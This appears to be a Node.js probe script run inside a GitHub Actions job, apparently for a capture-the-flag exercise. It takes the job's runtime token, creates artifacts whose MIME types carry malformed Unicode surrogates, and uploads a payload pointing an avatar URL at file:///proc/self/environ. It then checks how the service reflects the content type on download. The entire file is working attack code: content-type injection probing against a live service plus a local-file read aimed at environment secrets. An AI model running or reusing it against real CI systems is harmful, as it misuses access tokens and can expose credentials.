module.exports = async function scan() {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const endpoint = `${origin}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`;
  const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
  const candidates = [
    ['low-surrogate', 'application/json\udc85'],
    ['high-surrogate', 'application/json\ud885'],
    ['surrogate-pair', 'application/json\ud800\udc85'],
    ['lone-surrogate-before-semi', 'application/json\udc85; charset=utf-8'],
  ];
  for (const [label, mime] of candidates) {
    const name = `surrogate-${label}-${Date.now()}`;
    const create = await fetch(endpoint, {
      method: 'POST',
      headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify({...ids, name, version: 7, mime_type: mime}),
    });
    const data = await create.json().catch(() => ({}));
    console.log(`${label}: Create HTTP ${create.status}; ${data.msg || ''}; ok=${Boolean(data.ok)}`);
    if (!create.ok || !data.ok) continue;
    const payload = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');
    const put = await fetch(data.signed_upload_url || data.signedUploadUrl, {
      method: 'PUT',
      headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob'},
      body: payload,
    });
    console.log(`${label}: PUT HTTP ${put.status}`);
    if (!put.ok) continue;
    const finalized = await fetch(endpoint.replace('/CreateArtifact', '/FinalizeArtifact'), {
      method: 'POST',
      headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify({...ids, name, size: String(payload.length)}),
    });
    const result = await finalized.json().catch(() => ({}));
    const id = result.artifact_id || result.artifactId;
    console.log(`${label}: Finalize HTTP ${finalized.status}; id=${id || 'none'}`);
    if (!id) continue;
    const rest = await fetch(`https://api.github.com/repos/ijuns/repo-cassette-ctf-probe/actions/artifacts/${id}/zip`, {
      redirect: 'manual',
      headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json'},
    });
    const location = rest.headers.get('location');
    const rsct = location ? new URL(location).searchParams.get('rsct') : null;
    const download = location ? await fetch(location, {method: 'HEAD'}) : null;
    console.log(`${label}: REST HTTP ${rest.status}; rsct=${JSON.stringify(rsct)}; Content-Type=${JSON.stringify(download?.headers.get('content-type'))}`);
  }
};
